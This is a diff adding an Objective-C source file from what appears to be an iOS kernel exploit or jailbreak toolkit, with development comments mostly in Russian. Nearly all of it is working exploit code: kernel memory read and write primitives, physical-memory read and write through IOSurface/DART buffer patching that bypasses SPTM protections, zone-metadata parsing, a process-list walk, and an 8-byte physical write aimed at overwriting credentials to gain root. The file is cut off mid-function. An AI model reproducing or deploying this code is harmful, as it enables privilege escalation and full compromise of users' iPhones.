@@ -1,0 +1,10711 @@
+#import "KPDump.h"
+#import "KPLog.h"
+
+#import <errno.h>
+#import <pthread.h>
+#import <stdatomic.h>
+#import <string.h>
+#import <dlfcn.h>
+#import <mach-o/dyld.h>
+#import <sys/mman.h>
+#import <sys/utsname.h>
+#import <sys/wait.h>
+#import <unistd.h>
+#import <UIKit/UIKit.h>
+#import <QuartzCore/QuartzCore.h>
+
+#import <mach/mach_error.h>
+#import <IOKit/IOKitLib.h>
+#import <Metal/Metal.h>
+#import <os/log.h>
+#import <ImageIO/ImageIO.h>
+// В SDK есть (этот же хедер импортирует exploit/kexploit_opa334.m):
+// IOSurfaceCreate/IOSurfaceGetID + ключи kIOSurface* для M2Scaler UAF-рига.
+#import <IOSurface/IOSurfaceRef.h>
+
+// In IOKit on device but not declared in the theos SDK headers we ship.
+extern kern_return_t IORegistryEntryGetRegistryEntryID(io_registry_entry_t entry, uint64_t *entryID);
+
+// mach_vm.h is "unsupported" in the iOS SDK, but the routines live in
+// libSystem. Declare them; used by E10's launchd read-back verification.
+#include <mach/kern_return.h>
+#include <mach/machine.h>
+#include <mach/port.h>
+extern kern_return_t mach_vm_region(vm_map_read_t target_task, mach_vm_address_t *address, mach_vm_size_t *size, vm_region_flavor_t flavor, vm_region_info_t info, mach_msg_type_number_t *infoCnt, mach_port_t *object_name);
+extern kern_return_t mach_vm_read(vm_map_read_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);
+extern kern_return_t mach_vm_deallocate(vm_map_read_t target_task, mach_vm_address_t address, mach_vm_size_t size);
+
+#import <libjailbreak/info.h>
+#import <libjailbreak/primitives.h>
+#import <libjailbreak/translation.h>
+
+#import "exploit/kexploit_opa334.h" // darksword_*_socket_pcb() (corrupted inpcb VAs) for the zone route
+#import "exploit/kutils.h"          // proc_self() — direct own-proc VA, no allproc walk
+#import "exploit/offsets.h"         // off_proc_ro_pr_task / off_task_map
+
+static BOOL kpLooksLikeKernelPointer(uint64_t v)
+{
+    return (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL;
+}
+
+static void kpNote(NSMutableString *report, NSString *line)
+{
+    [[KPLog shared] append:line];
+    if (report) [report appendFormat:@"%@\n", line];
+}
+
+// 1.9.178b: безопасный ли VA для дерефа — walker дал PA + тип не deadly
+// ({0x37, 0xb} — пойман census'ом на железе: последний тип перед смертью).
+// Census-лог идёт из translation.c через callback — последний тип в syslog
+// перед любым ресетом и есть убийца.
+static void kpFrameTypeLogCb(int t, uint64_t pa)
+{
+    static uint32_t seenBits[8] = {0, 0, 0, 0, 0, 0, 0, 0};
+    if (t < 0 || (seenBits[t >> 5] & (1u << (t & 31)))) return;
+    seenBits[t >> 5] |= (1u << (t & 31));
+    kpNote(NULL, [NSString stringWithFormat:@"  [frame-type census] type=0x%x (pa=%#llx)", t, (unsigned long long)pa]);
+}
+
+static BOOL kpSafeToRead(uint64_t va)
+{
+    uint64_t pa = kvtophys(va);
+    return pa && !kpFrameDeadly(pa);
+}
+
+// 1.9.244: per-cpu дискриминатор zone_require (р.58/59 — формула подтверждена
+// самой паникой zalloc.c:1308): metaBase=[sym+0x68]; meta=metaBase+(VA>>14)*0x10;
+// zoneIdx=*(u16*)meta & 0x3ff; zone=zoneArr+zoneIdx*0xc0; perCpu=([zone+0x3c]>>6)&1.
+// Рет: 1 = per-cpu зона (запись легальна, но ЛЮБОЙ generic-free по ней паникует),
+// 0 = обычная зона, -1 = не зона / не удалось (VM-map класс — вне guard'а).
+static int kpZoneClass(uint64_t va)
+{
+    static uint64_t metaBase = 0, zoneArr = 0;
+    if (!metaBase) {
+        uint64_t symPtr = kconstant(base) + 0xa9c758ULL;   // unslid 0xfffffff007a9c758
+        uint64_t mb = early_kread64(symPtr + 0x68);
+        if (!kpLooksLikeKernelPointer(mb)) return -1;
+        metaBase = mb;
+        zoneArr  = kconstant(base) + 0x3a5b7c0ULL;          // unslid 0xfffffff00aa5f7c0
+    }
+    uint64_t meta = metaBase + (va >> 14) * 0x10;
+    if (!kpSafeToRead(meta)) return -1;
+    uint8_t zb[2] = {0, 0};
+    kreadbuf(meta, zb, 2);
+    uint32_t zoneIdx = *(uint16_t *)zb & 0x3ff;
+    uint64_t zone = zoneArr + (uint64_t)zoneIdx * 0xc0;
+    if (!kpSafeToRead(zone + 0x3c)) return -1;
+    uint8_t f = 0;
+    kreadbuf(zone + 0x3c, &f, 1);
+    return (f >> 6) & 1;
+}
+
+// 1.9.251 (р.63 Q2): zone-map VA→PA через PAPT/арену ядра — БЕЗ обхода таблиц
+// (ветка VM/RO охраняется deadly-фреймами 0x15/0xb, walker туда не ходит).
+// Сам zalloc резолвит zone-VA через этот же реестр (резолвер 0x87b02e0):
+// entries stride 0x18, PA = entryPA + (VA − VAbase). Расклад полей записи
+// авто-детектится (р.63 {VA,+0x08 PA,+0x10 np} vs сток {PA@0,VA@8,np@16}):
+// VA-поле = qword формы 0xffffff…, PA-поле = второе. Рет 0 = не покрыто.
+static uint64_t kpZoneVtoP(uint64_t va)
+{
+    uint64_t tbl = 0, n = 0;
+    if (kp_papt_table_va && kp_papt_table_n) { tbl = kp_papt_table_va; n = kp_papt_table_n; }
+    else if (ksymbol(libsptm_papt_ranges)) {
+        tbl = kread_ptr(ksymbol(libsptm_papt_ranges));
+        n = kread32(kread64(ksymbol(libsptm_n_papt_ranges)));
+    }
+    if (!tbl || !n || n > 512) return 0;
+    for (uint64_t i = 0; i < n; i++) {
+        // 1.9.276: читаем таблицу через early_kread64 НАПРЯМУЮ — она лежит в
+        // SPTM-прилегающем регионе (0xfffffff01e…), и kpRead/kreadbuf режут её
+        // EL2-гардом («чтение = паника, пропуск» — 275-я). Сам zalloc резолвит
+        // через неё на EL1 (резолвер 0x87b02e0) — значит читается безопасно.
+        if (kp_papt_format == 1) {
+            // 16-B fast-path: {va_base@0, start_pfn(u32)@8, count(u24)|flags(u8)@12}
+            uint64_t vaBase = early_kread64(tbl + i * 16);
+            uint64_t hi = early_kread64(tbl + i * 16 + 8);
+            uint32_t startPfn = (uint32_t)hi, rawCnt = (uint32_t)(hi >> 32);
+            uint64_t np = rawCnt & 0xFFFFFF;
+            if (np && va >= vaBase && va < vaBase + np * 0x4000ULL)
+                return (uint64_t)startPfn * 0x4000ULL + (va - vaBase);
+            continue;
+        }
+        uint64_t q[3] = { early_kread64(tbl + i * 24), early_kread64(tbl + i * 24 + 8), early_kread64(tbl + i * 24 + 16) };
+        uint64_t vaBase = 0, paBase = 0;
+        for (int k = 0; k < 2; k++) {
+            if ((q[k] & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) { vaBase = q[k]; paBase = q[k ^ 1]; break; }
+        }
+        uint64_t np = q[2] & 0xFFFFFFFFULL;
+        if (!np) np = q[2];   // некоторые расклады — полный qword
+        if (vaBase && np && np < 0x100000 && va >= vaBase && va < vaBase + np * 0x4000ULL)
+            return paBase + (va - vaBase);
+    }
+    return 0;
+}
+
+// 1.9.252: physread 16KB через DART — патчим entry[0] record buffer'а
+// SRC-поверхности на targetPA>>14 и сабмитим НОРМАЛЬНЫМ направлением: DMA читает
+// охраняемую страницу (deadly для CPU — SPTM не смотрит на DART) как содержимое
+// src и кладёт её в dst-поверхность, которую мы читаем с юзер-стороны.
+// (Swap-вариант 1.9.252a мёртв: обратное направление опа дропается молча, 2/2.)
+// Рет YES = out заполнен 0x4000 байтами targetPA-страницы.
+// 1.9.272 (р.64/67): physread 16KB через DART — СВОЯ пара 1024×16 (материализованная:
+// backing ленивый — rdPA=0 в 255-260 = оп молча дропался), свежий pipe, патч ВСЕХ
+// записей rd-буфера на targetPA>>14 ДО первого submit (первый map = сериализация из
+// record buffer). Rect {0,0,1024,4} = полные 16KB сплошь (stride 0x1000).
+static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, uint64_t isTable,
+                          uint64_t targetPA, uint8_t *out, NSMutableString *r)
+{
+    memset(out, 0, 0x4000);
+    NSDictionary *spB = @{(__bridge id)kIOSurfaceWidth: @1024, (__bridge id)kIOSurfaceHeight: @16,
+                          (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
+    IOSurfaceRef rdS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
+    IOSurfaceRef dsS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
+    if (!rdS || !dsS) { if (rdS) CFRelease(rdS); if (dsS) CFRelease(dsS); return NO; }
+    // материализация backing ДО резолва/патча (урок 255-260: rdPA=0 → дроп)
+    IOSurfaceLock(rdS, 0, NULL);
+    uint8_t *rp0 = (uint8_t *)IOSurfaceGetBaseAddress(rdS);
+    if (rp0) memset(rp0, 0x5A, 0x4000);
+    IOSurfaceUnlock(rdS, 0, NULL);
+    IOSurfaceLock(dsS, 0, NULL);
+    uint8_t *dp0 = (uint8_t *)IOSurfaceGetBaseAddress(dsS);
+    if (dp0) memset(dp0, 0, 0x4000);
+    IOSurfaceUnlock(dsS, 0, NULL);
+    BOOL done = NO;
+    uint64_t rdVA = 0, rdBuf = 0;
+    uint32_t rdID = IOSurfaceGetID(rdS);
+    uint32_t dsID = IOSurfaceGetID(dsS);
+    typedef mach_port_t (*CreateMachPort_t)(IOSurfaceRef);
+    CreateMachPort_t pCmp = (CreateMachPort_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+    mach_port_t mp = pCmp ? pCmp(rdS) : 0;
+    if (mp) {
+        uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * (mp >> 8);
+        uint64_t pVA = kp_untag_ptr(early_kread64(eVA + off_ipc_entry_ie_object));
+        uint64_t kobj = kpLooksLikeKernelPointer(pVA) ? kp_untag_ptr(early_kread64(pVA + off_ipc_port_ip_kobject)) : 0;
+        uint64_t fobj = kpLooksLikeKernelPointer(kobj) ? kp_untag_ptr(early_kread64(kobj + 0x30)) : 0;
+        uint64_t kslide = kconstant(base) - 0xfffffff007004000ULL;
+        if (kpLooksLikeKernelPointer(fobj) && kp_untag_ptr(early_kread64(fobj)) == 0xfffffff007eef4c8ULL + kslide) {
+            uint64_t cand = kp_untag_ptr(early_kread64(fobj + 0x18));
+            if (kpLooksLikeKernelPointer(cand) && (uint32_t)early_kread64(cand + 0x10) == rdID) rdVA = cand;
+        }
+        mach_port_destroy(mach_task_self(), mp);
+    }
+    if (rdVA) {
+        uint8_t *rpix = NULL;
+        IOSurfaceLock(rdS, 0, NULL);
+        rpix = (uint8_t *)IOSurfaceGetBaseAddress(rdS);
+        IOSurfaceUnlock(rdS, 0, NULL);
+        uint64_t rdPA = (rpix && ttM) ? vtophys(ttM, (uint64_t)rpix) : 0;
+        uint64_t pd = kp_untag_ptr(early_kread64(rdVA + 0x30));
+        uint64_t typ = pd ? (early_kread64(pd + 0x20) & 0xf0) : 0;
+        uint64_t hdr = (typ == 0x10) ? kp_untag_ptr(early_kread64(pd + 0x90)) : 0;
+        uint64_t buf = hdr ? kp_untag_ptr(early_kread64(hdr + 0x10)) : 0;
+        uint32_t cnt = buf ? (uint32_t)early_kread64(buf + 0x28) : 0;
+        uint64_t e0 = buf ? early_kread64(buf + 0x30) : 0;
+        BOOL ok = buf && cnt && cnt < 0x1000 && (uint32_t)e0 != 0 &&
+                  ((uint32_t)(e0 >> 32) == 0 || (uint32_t)(e0 >> 32) == 4);
+        kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] rdVA=%#llx rdPA=%#llx type=%#llx buf=%#llx cnt=%#x entry0=%#018llx — %@",
+                  (unsigned long long)rdVA, (unsigned long long)rdPA, (unsigned long long)typ, (unsigned long long)buf, cnt,
+                  (unsigned long long)e0, ok ? @"OK" : @"маркеры МИМО"]);
+        if (ok) rdBuf = buf;
+    }
+    if (rdBuf) {
+        io_connect_t v2 = IO_OBJECT_NULL;
+        kern_return_t ok2 = IOServiceOpen(svc, mach_task_self(), 0, &v2);
+        if (ok2 == KERN_SUCCESS && v2) {
+            uint32_t tPFN = (uint32_t)((targetPA & ~0x3fffULL) >> 14);
+            uint32_t cntR = (uint32_t)early_kread64(rdBuf + 0x28);
+            if (cntR > 64) cntR = 64;
+            for (uint32_t i = 0; i < cntR; i++) {
+                uint64_t e = early_kread64(rdBuf + 0x30 + (uint64_t)i * 8);
+                usleep(300);
+                early_kwrite64(rdBuf + 0x30 + (uint64_t)i * 8, (e & 0xffffffff00000000ULL) | tPFN);
+            }
+            // р.68: bit1=0 + [buf+0x10]=0 последними записями перед submit
+            uint8_t fR = 0; kreadbuf(rdBuf + 0x2d, &fR, 1);
+            uint64_t sR = early_kread64(rdBuf + 0x10);
+            if (sR) early_kwrite64(rdBuf + 0x10, 0);
+            if (fR & 0x02) {
+                uint64_t fl = early_kread64(rdBuf + 0x28);
+                early_kwrite64(rdBuf + 0x28, (fl & ~(0xffULL << 40)) | ((uint64_t)(fR & ~0x02) << 40));
+            }
+            uint8_t tsdR[0x1B0];
+            memcpy(tsdR, tsdV, sizeof(tsdR));
+            *(uint32_t *)(tsdR + 0) = rdID;
+            *(uint32_t *)(tsdR + 4) = dsID;
+            *(uint64_t *)(tsdR + 8) = 1;
+            *(uint32_t *)(tsdR + 0x0C) = 1024;
+            *(uint32_t *)(tsdR + 0x10) = 4;
+            *(uint32_t *)(tsdR + 0xdc) = 0;   // rect x
+            *(uint32_t *)(tsdR + 0xe0) = 0;   // rect y
+            *(uint32_t *)(tsdR + 0xe4) = 1024;// rect w
+            *(uint32_t *)(tsdR + 0xec) = 4;   // rect h
+            kern_return_t rkr = IOConnectCallMethod(v2, 1, NULL, 0, tsdR, sizeof(tsdR), NULL, NULL, NULL, NULL);
+            usleep(400000);
+            IOServiceClose(v2);   // restore не нужен — CFRelease(rdS) унесёт яд с поверхностью
+            IOSurfaceLock(dsS, 0, NULL);
+            uint8_t *spR = (uint8_t *)IOSurfaceGetBaseAddress(dsS);
+            if (spR) memcpy(out, spR, 0x4000);
+            IOSurfaceUnlock(dsS, 0, NULL);
+            kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] target=%#llx kr=0x%x sig=%#010x flags=%#x",
+                      (unsigned long long)targetPA, rkr, *(uint32_t *)out, fR]);
+            done = YES;
+        } else {
+            kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] fresh pipe: open kr=0x%x", ok2]);
+        }
+    } else {
+        kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] rdVA/rdBuf нет (rdVA=%#llx) — чтение пропущено", (unsigned long long)rdVA]);
+    }
+    CFRelease(rdS);
+    CFRelease(dsS);
+    return done;
+}
+
+// 1.9.273: TLB per-CPU — ucredVA закэширована на CPU, где бежал наш поток.
+// Потоки-поллеры getuid(): поток на СВЕЖЕМ CPU читает по НОВОЙ таблице → fkPA → 0.
+static _Atomic int gEvictHit = 0;
+static void *kpEvictWorker(void *arg)
+{
+    for (int i = 0; i < 4000 && !atomic_load(&gEvictHit); i++) {
+        if (getuid() == 0) { atomic_store(&gEvictHit, 1); break; }
+        if ((i & 0x3f) == 0x3f) usleep(5000);
+    }
+    return NULL;
+}
+
+// 1.9.272: physwrite РОВНО 8 байт по targetPA+boff — своя пара 4096×16 (stride
+// 0x4000, boff ложится на y=0), материализованная. Для L3-инжекции ucred.
+static BOOL kpPhysWrite8v2(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, uint64_t isTable,
+                           uint64_t targetPA, uint32_t boff, uint64_t payload, NSMutableString *r)
+{
+    NSDictionary *spB = @{(__bridge id)kIOSurfaceWidth: @4096, (__bridge id)kIOSurfaceHeight: @16,
+                          (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
+    IOSurfaceRef rdS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
+    IOSurfaceRef wdS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
+    if (!rdS || !wdS) { if (rdS) CFRelease(rdS); if (wdS) CFRelease(wdS); return NO; }
+    // материализация backing (урок 255-260)
+    IOSurfaceLock(rdS, 0, NULL);
+    uint8_t *rp0 = (uint8_t *)IOSurfaceGetBaseAddress(rdS);
+    if (rp0) memset(rp0, 0x5A, 0x4000);
+    IOSurfaceUnlock(rdS, 0, NULL);
+    IOSurfaceLock(wdS, 0, NULL);
+    uint8_t *wp0 = (uint8_t *)IOSurfaceGetBaseAddress(wdS);
+    if (wp0) memset(wp0, 0, 0x4000);
+    IOSurfaceUnlock(wdS, 0, NULL);
+    BOOL done = NO;
+    uint64_t wdVA = 0, wdBuf = 0;
+    uint32_t rdID = IOSurfaceGetID(rdS);
+    uint32_t wdID = IOSurfaceGetID(wdS);
+    typedef mach_port_t (*CreateMachPort_t)(IOSurfaceRef);
+    CreateMachPort_t pCmp = (CreateMachPort_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+    mach_port_t mp = pCmp ? pCmp(wdS) : 0;
+    if (mp) {
+        uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * (mp >> 8);
+        uint64_t pVA = kp_untag_ptr(early_kread64(eVA + off_ipc_entry_ie_object));
+        uint64_t kobj = kpLooksLikeKernelPointer(pVA) ? kp_untag_ptr(early_kread64(pVA + off_ipc_port_ip_kobject)) : 0;
+        uint64_t fobj = kpLooksLikeKernelPointer(kobj) ? kp_untag_ptr(early_kread64(kobj + 0x30)) : 0;
+        uint64_t kslide = kconstant(base) - 0xfffffff007004000ULL;
+        if (kpLooksLikeKernelPointer(fobj) && kp_untag_ptr(early_kread64(fobj)) == 0xfffffff007eef4c8ULL + kslide) {
+            uint64_t cand = kp_untag_ptr(early_kread64(fobj + 0x18));
+            if (kpLooksLikeKernelPointer(cand) && (uint32_t)early_kread64(cand + 0x10) == wdID) wdVA = cand;
+        }
+        mach_port_destroy(mach_task_self(), mp);
+    }
+    if (wdVA) {
+        uint64_t pd = kp_untag_ptr(early_kread64(wdVA + 0x30));
+        uint64_t typ = pd ? (early_kread64(pd + 0x20) & 0xf0) : 0;
+        uint64_t hdr = (typ == 0x10) ? kp_untag_ptr(early_kread64(pd + 0x90)) : 0;
+        uint64_t buf = hdr ? kp_untag_ptr(early_kread64(hdr + 0x10)) : 0;
+        uint32_t cnt = buf ? (uint32_t)early_kread64(buf + 0x28) : 0;
+        uint64_t e0 = buf ? early_kread64(buf + 0x30) : 0;
+        if (buf && cnt && cnt < 0x1000 && (uint32_t)e0 != 0 &&
+            ((uint32_t)(e0 >> 32) == 0 || (uint32_t)(e0 >> 32) == 4)) wdBuf = buf;
+    }
+    if (wdBuf) {
+        uint64_t tpage = targetPA & ~0x3fffULL;
+        uint64_t eSave = early_kread64(wdBuf + 0x30);
+        usleep(1500);
+        early_kwrite64(wdBuf + 0x30, (eSave & 0xffffffff00000000ULL) | (uint32_t)(tpage >> 14));
+        // р.68: bit1=0 + [buf+0x10]=0 перед submit
+        uint8_t fw = 0; kreadbuf(wdBuf + 0x2d, &fw, 1);
+        uint64_t sW = early_kread64(wdBuf + 0x10);
+        if (sW) early_kwrite64(wdBuf + 0x10, 0);
+        if (fw & 0x02) {
+            uint64_t fl = early_kread64(wdBuf + 0x28);
+            early_kwrite64(wdBuf + 0x28, (fl & ~(0xffULL << 40)) | ((uint64_t)(fw & ~0x02) << 40));
+        }
+        IOSurfaceLock(rdS, 0, NULL);
+        uint8_t *rpix = (uint8_t *)IOSurfaceGetBaseAddress(rdS);
+        if (rpix) *(uint64_t *)(rpix + boff) = payload;
+        IOSurfaceUnlock(rdS, 0, NULL);
+        io_connect_t v2 = IO_OBJECT_NULL;
+        kern_return_t ok2 = IOServiceOpen(svc, mach_task_self(), 0, &v2);
+        if (ok2 == KERN_SUCCESS && v2) {
+            uint8_t tsdW[0x1B0];
+            memcpy(tsdW, tsdV, sizeof(tsdW));
+            *(uint32_t *)(tsdW + 0) = rdID;
+            *(uint32_t *)(tsdW + 4) = wdID;
+            *(uint64_t *)(tsdW + 8) = 1;
+            *(uint32_t *)(tsdW + 0x0C) = 2;
+            *(uint32_t *)(tsdW + 0x10) = 1;
+            *(uint32_t *)(tsdW + 0xdc) = (boff % 0x4000) / 4;   // rect x (stride 0x4000 → y=0)
+            *(uint32_t *)(tsdW + 0xe0) = boff / 0x4000;
+            *(uint32_t *)(tsdW + 0xe4) = 2;
+            *(uint32_t *)(tsdW + 0xec) = 1;
+            kern_return_t rkr = IOConnectCallMethod(v2, 1, NULL, 0, tsdW, sizeof(tsdW), NULL, NULL, NULL, NULL);
+            usleep(400000);
+            IOServiceClose(v2);
+            kpNote(r, [NSString stringWithFormat:@"  [PHYSWRITE8v2] target=%#llx+%#x payload=%#018llx kr=0x%x",
+                      (unsigned long long)targetPA, boff, payload, rkr]);
+            done = (rkr == 0);
+        }
+        early_kwrite64(wdBuf + 0x30, eSave);
+    } else {
+        kpNote(r, [NSString stringWithFormat:@"  [PHYSWRITE8v2] wdVA/wdBuf нет (wdVA=%#llx)", (unsigned long long)wdVA]);
+    }
+    CFRelease(rdS);
+    CFRelease(wdS);
+    return done;
+}
+
+// The EL2 domain faults in the physical aperture when read via the socket
+// primitive — PANIC. 1.9.6: the old "whole 01..02 band minus kernel image"
+// guard also blocked the libsptm PAPT table, which lives in ordinary EL1
+// kernel map (0xfffffff011…/0x013…/0x029… across boots) and is read by the
+// kernel from EL1 in 123 places. Block exactly the SPTM/TXM image spans
+// (bases from the EXP-02 formula) and nothing else.
+static BOOL kpVAIsEL2Domain(uint64_t addr)
+{
+    uint64_t sptm = gSystemInfo.kernelConstant.sptmBase;
+    if (sptm && addr >= sptm && addr < sptm + 0xF4000ULL) return YES;
+    uint64_t txm = gSystemInfo.kernelConstant.txmBase;
+    if (txm && addr >= txm && addr < txm + 0x64000ULL) return YES;
+    // Fallback before the bases are derived: only the bare 01/02 band minus
+    // the kernel image (the pre-formula behaviour).
+    if (!sptm && !txm) {
+        BOOL inBand = addr >= 0xfffffff010000000ULL && addr < 0xfffffff030000000ULL;
+        if (!inBand) return NO;
+        uint64_t kb = kconstant(base);
+        if (kb && addr >= kb && addr < kb + 0x5000000ULL) return NO;
+        return YES;
+    }
+    return NO;
+}
+
+// 1.7.3: forward decls — the unmapped-read gate in kpRead uses the ttep
+// globals that are defined below (they back kpWalkCandidateHead too).
+static uint64_t gCpuTtepVA;
+static uint64_t gCpuTtepPhys;
+
+// Read kernel memory. Universal per field data; the only forbidden range is
+// the EL2 SPTM/TXM image domain (panic on read).
+static BOOL kpRead(uint64_t addr, void *out, size_t size, const char *what, NSMutableString *report)
+{
+    if (!addr) {
+        kpNote(report, [NSString stringWithFormat:@"  %-32s пропуск: ключ не найден в словаре оффсетов", what]);
+        return NO;
+    }
+    if (kpVAIsEL2Domain(addr)) {
+        kpNote(report, [NSString stringWithFormat:@"  %-32s VA 0x%llx в EL2-домене (SPTM/TXM) — чтение = паника, пропуск", what, addr]);
+        return NO;
+    }
+    // 1.7.3: unmapped-read gate. EXP-02's pointer-vote chased a garbage pointee
+    // to base+0xad5f40 — an unmapped hole just past the kernel image — and the
+    // kernel-side read panicked ("Unexpected fault in kernel physical
+    // aperture", FAR=that VA). With translation up, prove both ends of the
+    // range are backed before reading. Costs 2 page-table walks per read; a
+    // dead read costs a reboot.
+    // 1.9.5: but NOT inside the kernel image itself — the image is always
+    // mapped, and the gate was false-refusing kernel statics
+    // (libsptm_frame_table, SPTMArgs) on this boot.
+    uint64_t kb = kconstant(base);
+    BOOL inKernelImage = kb && addr >= kb && addr + size <= kb + 0x5000000ULL;
+    if (!inKernelImage && (gCpuTtepVA || gCpuTtepPhys)) {
+        if (kvtophys(addr) == 0 || kvtophys(addr + size - 1) == 0) {
+            kpNote(report, [NSString stringWithFormat:@"  %-32s VA 0x%llx незамаплен (kvtophys=0) — пропуск", what, addr]);
+            return NO;
+        }
+    }
+    memset(out, 0, size);
+    kreadbuf(addr, out, size);
+    return YES;
+}
+
+static void kpAppendHexDump(NSMutableString *out, uint64_t baseAddr, const void *data, size_t size)
+{
+    const uint8_t *bytes = (const uint8_t *)data;
+    for (size_t i = 0; i < size; i += 16) {
+        NSMutableString *hex = [NSMutableString string];
+        NSMutableString *asc = [NSMutableString string];
+        for (size_t j = i; j < i + 16 && j < size; j++) {
+            [hex appendFormat:@"%02x ", bytes[j]];
+            [asc appendFormat:@"%c", (bytes[j] >= 0x20 && bytes[j] <= 0x7e) ? bytes[j] : '.'];
+        }
+        while (hex.length < 16 * 3) [hex appendString:@"   "];
+        [out appendFormat:@"    0x%016llx: %@| %@\n", baseAddr + i, hex, asc];
+    }
+}
+
+// Guarded hexdump of a region. Returns YES when the read happened.
+static BOOL kpDumpRegion(NSMutableString *report, const char *what, uint64_t addr, size_t size)
+{
+    if (!addr) {
+        kpNote(report, [NSString stringWithFormat:@"  %-32s пропуск: ключ не найден в словаре оффсетов", what]);
+        return NO;
+    }
+    void *buf = malloc(size);
+    if (!kpRead(addr, buf, size, what, report)) {
+        free(buf);
+        return NO;
+    }
+    NSMutableString *hex = [NSMutableString string];
+    kpAppendHexDump(hex, addr, buf, size);
+    [[KPLog shared] append:hex];
+    if (report) [report appendString:hex];
+    free(buf);
+    return YES;
+}
+
+// Guarded u64 read; value goes to *out (untouched on failure).
+static BOOL kpReadU64(const char *what, uint64_t addr, uint64_t *out, NSMutableString *report)
+{
+    uint64_t v = 0;
+    if (!kpRead(addr, &v, sizeof(v), what, report)) return NO;
+    kpNote(report, [NSString stringWithFormat:@"  %-32s = 0x%016llx", what, v]);
+    *out = v;
+    return YES;
+}
+
+// VA/PA forms of the tagged cpu_ttep value (set by initializeBootConstantsGuarded;
+// the survey's translation self-check picks the mode that actually walks).
+static uint64_t gCpuTtepVA = 0;
+static uint64_t gCpuTtepPhys = 0;
+
+@interface KPM2ScalerTrigger : NSObject
+@property (nonatomic, strong) UIView *view;
+@property (nonatomic, strong) CADisplayLink *link;
+@property (nonatomic, assign) IOSurfaceRef surface;
+@property (nonatomic, assign) uint32_t frame;
+- (void)startWithSurface:(IOSurfaceRef)surface;
+- (void)stop;
+@end
+
+@implementation KPDump
+
+// Walk allproc by comm name via the fast pid-walk path (ksymbol(allproc),
+// 2 reads/node — the one that found launchd), reading p_name @ off_proc_p_name
+// (0x57d on 18.6) instead of gCommOff (which needs a dead gAllprocHead).
++ (uint64_t)findProcByCommName:(const char *)name log:(NSMutableString *)r
+{
+    uint64_t sym = ksymbol(allproc);
+    if (!sym) { kpNote(r, @"  allproc: ключ не найден — пропуск"); return 0; }
+    uint64_t head = 0;
+    if (!kpRead(sym, &head, sizeof(head), "allproc head", r)) return 0;
+    head = kp_untag_ptr(head);
+    if (!kpLooksLikeKernelPointer(head)) return 0;
+    size_t len = strlen(name);
+    if (len > 15) len = 15; // p_name is bounded
+    uint64_t node = head, prev = 0;
+    for (int n = 0; n < 1536; n++) {
+        if (!kpLooksLikeKernelPointer(node) || node == prev) {
+            if (n) kpNote(r, [NSString stringWithFormat:@"  цепь оборвалась на узле %d", n]);
+            break;
+        }
+        char pname[17] = {0};
+        kreadbuf(node + off_proc_p_name, pname, 16);
+        pname[16] = 0;
+        if (pname[0] && memcmp(pname, name, len) == 0) {
+            kpNote(r, [NSString stringWithFormat:@"  процесс \"%s\" (p_name=\"%s\") @ %#llx (узлов=%d)", name, pname, node, n]);
+            return node;
+        }
+        uint64_t next = 0;
+        kreadbuf(node, &next, sizeof(next));
+        prev = node;
+        node = kp_untag_ptr(next);
+        if ((n & 0xFF) == 0xFF) kpNote(r, [NSString stringWithFormat:@"  …fast walk: %d узлов, ищем \"%s\"", n + 1, name]);
+    }
+    kpNote(r, [NSString stringWithFormat:@"  процесс \"%s\" не найден fast walk'ом", name]);
+    return 0;
+}
+
++ (void)initializeBootConstantsGuarded
+{
+    NSMutableString *scratch = [NSMutableString string];
+
+    gSystemInfo.kernelConstant.base = kconstant(staticBase) + gSystemInfo.kernelConstant.slide;
+
+    // 18.6: these globals hold PAC-tagged values. Strip with kp_untag_ptr and
+    // store only when the stripped result is sane. cpu_ttep is special: it is
+    // a TTBR value (ASID in bits 63:48, phys base in 47:0) — its phys part is
+    // masked WITHOUT sign extension. The VA-form strip is kept separately for
+    // the VA-mode translation self-check in the survey.
+    uint64_t v = 0;
+    if (kpRead(ksymbol(gVirtBase), &v, sizeof(v), "gVirtBase", scratch)) {
+        uint64_t s = kp_untag_ptr(v);
+        BOOL sane = kpLooksLikeKernelPointer(s);
+        if (sane) gSystemInfo.kernelConstant.virtBase = s;
+        [[KPLog shared] appendFormat:@"  gVirtBase: raw=0x%016llx strip=0x%016llx%s",
+            (unsigned long long)v, (unsigned long long)s, sane ? "" : "  (не похож — не сохраняю)"];
+    }
+    v = 0;
+    if (kpRead(ksymbol(gPhysBase), &v, sizeof(v), "gPhysBase", scratch)) {
+        uint64_t s = kp_untag_ptr(v);
+        // 1.5.5: physBase is a PHYSICAL address — the kernel-VA mask used
+        // before rejected the real A17 value (0x10002af0000: DRAM aperture
+        // above 4GB, 16K-aligned) and left physBase=0, breaking the phystokv
+        // fallback. Validate it as a physical address instead.
+        BOOL sane = (s != 0 && (s & 0x3fffULL) == 0 && s <= 0x40000000000ULL);
+        if (sane) gSystemInfo.kernelConstant.physBase = s;
+        [[KPLog shared] appendFormat:@"  gPhysBase: raw=0x%016llx strip=0x%016llx%s",
+            (unsigned long long)v, (unsigned long long)s, sane ? "" : "  (не похож — не сохраняю)"];
+    }
+    v = 0;
+    if (kpRead(ksymbol(gPhysSize), &v, sizeof(v), "gPhysSize", scratch)) {
+        uint64_t s = kp_untag_ptr(v);
+        BOOL sane = (s != 0 && s <= 0x400000000ULL); // ≤16 GiB
+        if (sane) gSystemInfo.kernelConstant.physSize = s;
